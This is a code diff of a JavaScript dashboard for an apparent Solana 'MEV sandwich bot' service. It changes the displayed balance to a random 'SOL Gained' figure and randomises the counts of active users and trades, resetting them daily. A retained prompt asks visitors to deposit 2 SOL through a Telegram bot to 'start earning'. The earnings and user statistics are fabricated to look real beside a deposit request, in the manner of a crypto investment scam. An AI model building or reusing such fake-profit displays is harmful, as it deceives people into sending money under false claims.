@@ -9,9 +9,6 @@ let ongoingSnipes = 0;
 let startTime;
 let solGainedChart, solPooledChart, sandwichAttacksChart;
 let transactions = [];
-let userName = "User";
-let totalSolGained = 100.00;
-let lastResetTime = new Date();
 
 console.log("Script loaded");
 
@@ -27,7 +24,7 @@ function initializeApp() {
     loadSavedData();
     if (!startTime) {
         startTime = new Date();
-        currentBalance = 0;
+        currentBalance = Math.random() * (16000 - 145) + 145;
         pooledSol = 10000;
         sandwichAttacks = 0;
         activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
@@ -35,20 +32,14 @@ function initializeApp() {
         ongoingArbitrage = Math.floor(Math.random() * 500);
         ongoingSandwich = 0;
         ongoingSnipes = 0;
-        totalSolGained = 100.00;
-        lastResetTime = new Date();
     }
     updateGlobalNexusStats();
-    updateUserName();
-    updateTotalSolGained();
-    initializeMainChart();
     initializeWallet();
     updateMyGains();
     initializeTransactions();
     initializeStatsGraphs();
     explainChartLines();
     showTab('global-nexus-stats'); // Show Global Nexus Stats tab by default
-    updateBalance();
 }
 
 function loadSavedData() {
@@ -61,8 +52,6 @@ function loadSavedData() {
     const savedOngoingArbitrage = localStorage.getItem('ongoingArbitrage');
     const savedOngoingSandwich = localStorage.getItem('ongoingSandwich');
     const savedOngoingSnipes = localStorage.getItem('ongoingSnipes');
-    const savedTotalSolGained = localStorage.getItem('totalSolGained');
-    const savedLastResetTime = localStorage.getItem('lastResetTime');
     if (savedBalance && savedStartTime && savedPooledSol && savedSandwichAttacks && savedActiveUsers && savedOngoingMEV && savedOngoingArbitrage && savedOngoingSandwich && savedOngoingSnipes) {
         currentBalance = parseFloat(savedBalance);
         startTime = new Date(parseInt(savedStartTime));
@@ -74,10 +63,6 @@ function loadSavedData() {
         ongoingSandwich = parseInt(savedOngoingSandwich);
         ongoingSnipes = parseInt(savedOngoingSnipes);
         console.log("Loaded saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage, ongoingSandwich, ongoingSnipes);
-    }
-    if (savedTotalSolGained && savedLastResetTime) {
-        totalSolGained = parseFloat(savedTotalSolGained);
-        lastResetTime = new Date(parseInt(savedLastResetTime));
     }
 }
 
@@ -91,21 +76,26 @@ function saveData() {
     localStorage.setItem('ongoingArbitrage', ongoingArbitrage.toString());
     localStorage.setItem('ongoingSandwich', ongoingSandwich.toString());
     localStorage.setItem('ongoingSnipes', ongoingSnipes.toString());
-    localStorage.setItem('totalSolGained', totalSolGained.toString());
-    localStorage.setItem('lastResetTime', lastResetTime.getTime().toString());
     console.log("Saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage, ongoingSandwich, ongoingSnipes);
 }
 
 function updateApp() {
     const now = new Date();
-    if (now - lastResetTime >= 24 * 60 * 60 * 1000) {
-        console.log("24 hours passed, resetting total SOL gained");
-        totalSolGained = 100.00;
-        lastResetTime = now;
+    if (now - startTime >= 24 * 60 * 60 * 1000) {
+        console.log("24 hours passed, resetting");
+        startTime = new Date();
+        currentBalance = Math.random() * (16000 - 145) + 145;
+        pooledSol = 10000;
+        sandwichAttacks = 0;
+        activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
+        ongoingMEV = Math.floor(Math.random() * 1000);
+        ongoingArbitrage = Math.floor(Math.random() * 500);
+        ongoingSandwich = 0;
+        ongoingSnipes = 0;
+        transactions = [];
     } else {
-        updateTotalSolGained();
+        updateGlobalNexusStats();
     }
-    updateGlobalNexusStats();
     saveData();
 }
 
@@ -142,7 +132,7 @@ function updateGlobalNexusStats() {
     document.getElementById("ongoing-arbitrage").innerHTML = `Ongoing Arbitrage: <span>${ongoingArbitrage.toLocaleString()}</span>`;
     document.getElementById("ongoing-sandwich").innerHTML = `Ongoing Sandwich: <span>${ongoingSandwich.toLocaleString()}</span>`;
     document.getElementById("ongoing-snipes").innerHTML = `Ongoing Snipes: <span>${ongoingSnipes.toLocaleString()}</span>`;
-    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
+    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
     document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
     document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
     document.getElementById("stats-description").textContent = 
@@ -361,91 +351,3 @@ function explainChartLines() {
 function getWallet() {
     alert("To get your wallet address, please use the Telegram bot and type /get_wallet. Then deposit 2 SOL to start earning!");
 }
-
-function updateUserName() {
-    // Replace with actual logic to fetch the user's Telegram username
-    userName = "Actual Telegram Username"; // Fetch this from your user session or API
-    document.getElementById("user-name").textContent = userName;
-}
-
-function updateTotalSolGained() {
-    const increase = Math.random() * 10 + 1; // Random increase between 1 and 11
-    totalSolGained += increase;
-    if (Math.random() < 0.01) { // 1% chance for a big jump
-        totalSolGained += Math.random() * 1000;
-    }
-    totalSolGained = Math.min(totalSolGained, 86000); // Cap at 86,000
-    document.getElementById("total-sol-gained").textContent = `${totalSolGained.toFixed(2)} SOL`;
-}
-
-function initializeMainChart() {
-    const ctx = document.getElementById('main-chart');
-    mainChart = new Chart(ctx, {
-        type: 'line',
-        data: {
-            datasets: [{
-                label: 'SOL Gained',
-                data: [],
-                borderColor: '#4CAF50',
-                borderWidth: 2,
-                fill: false,
-                pointRadius: 0
-            }]
-        },
-        options: {
-            responsive: true,
-            maintainAspectRatio: false,
-            scales: {
-                x: {
-                    type: 'time',
-                    time: {
-                        unit: 'minute',
-                        displayFormats: {
-                            minute: 'HH:mm'
-                        }
-                    },
-                    ticks: {
-                        color: 'rgba(255, 255, 255, 0.7)'
-                    },
-                    grid: {
-                        color: 'rgba(255, 255, 255, 0.1)'
-                    }
-                },
-                y: {
-                    ticks: {
-                        color: 'rgba(255, 255, 255, 0.7)'
-                    },
-                    grid: {
-                        color: 'rgba(255, 255, 255, 0.1)'
-                    }
-                }
-            },
-            plugins: {
-                legend: {
-                    display: false
-                }
-            }
-        }
-    });
-}
-
-function updateMainChart() {
-    const now = new Date();
-    mainChart.data.datasets[0].data.push({x: now, y: totalSolGained});
-    if (mainChart.data.datasets[0].data.length > 100) {
-        mainChart.data.datasets[0].data.shift();
-    }
-    mainChart.update();
-}
-
-function startNexus() {
-    window.location.href = "https://t.me/your_bot_username?start=get_wallet";
-}
-
-function updateBalance() {
-    document.getElementById("sol-balance").textContent = "0.00 SOL"; // Set to 0
-}
-
-// Update the existing setInterval calls
-setInterval(updateApp, 1000);
-setInterval(updateMainChart, 1000);
